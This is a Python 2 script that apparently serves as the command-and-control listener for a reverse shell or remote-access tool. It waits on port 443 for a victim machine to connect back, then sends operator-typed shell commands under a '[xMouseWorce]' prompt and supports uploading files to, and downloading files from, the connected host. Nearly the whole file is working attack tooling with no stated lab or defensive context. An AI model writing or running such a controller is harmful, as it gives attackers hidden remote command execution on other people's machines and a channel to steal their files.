#!/usr/bin/python
# import python modules
from socket import *
HOST = ''                 # '' means bind to all interfaces
PORT = 443              #  port 
# create our socket handler
s = socket(AF_INET, SOCK_STREAM)
# set is so that when we cancel out we can reuse port
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
# bind to interface
s.bind((HOST, PORT))
# print we are accepting connections
print "Listening on 0.0.0.0:%s" % str(PORT)
# listen for only 10 connection
s.listen(10)
# accept connections
conn, addr = s.accept()
# print connected by ipaddress
print 'Connected by', addr
# receive initial connection
data = conn.recv(1024)
print repr(data)
# start loop
while True:     
     # enter shell command
     command = raw_input("[xMouseWorce]: ")
     # send shell command
     conn.send(command)
     # if we specify quit then break out of loop and close socket
     if command == "quit": break
     if command.startswith("cdx2"):
          path = command[5:]
          print "path has been change to ",path
     if command == "dirt":
          c=0
          print "*INFO*"
          while True:
               if c==1:
                    break
               l = conn.recv(1024)
               print l
               while(l):
                    if l.endswith("EOFEOFEOFEOFEOFXX"):
                         c=1
                         break
                    else:
                         c=1
                         break
     
     if command.startswith("upload") == True:
          sendFile= command[7:]
          print 'Uploading ', sendFile
          with open(sendFile,'rb') as f:
               while sendFile:
                    filedata = f.read()
                    if filedata == '':break
                    conn.send(filedata)
                    conn.send("EOFEOFEOFEOFEOFX")
                    print "succesfully Uploaded"
          f.close()
          
     if command.startswith("download") == True:
          downFile = command[9:]
          f = open(downFile,'wb')
          print 'downloading ' , downFile
          c=0
          while True:
               l = conn.recv(1024)
               if c==1:
                    break
               while (l):
                    if l.endswith("EOFEOFEOFEOFEOFX"):
                         u = l[:-16]
                         f.write(u)
                         c=1
                         break
                    else:
                         f.write(l)
                         l= conn.recv(1024)
                         c=1
          f.close()             
conn.close()
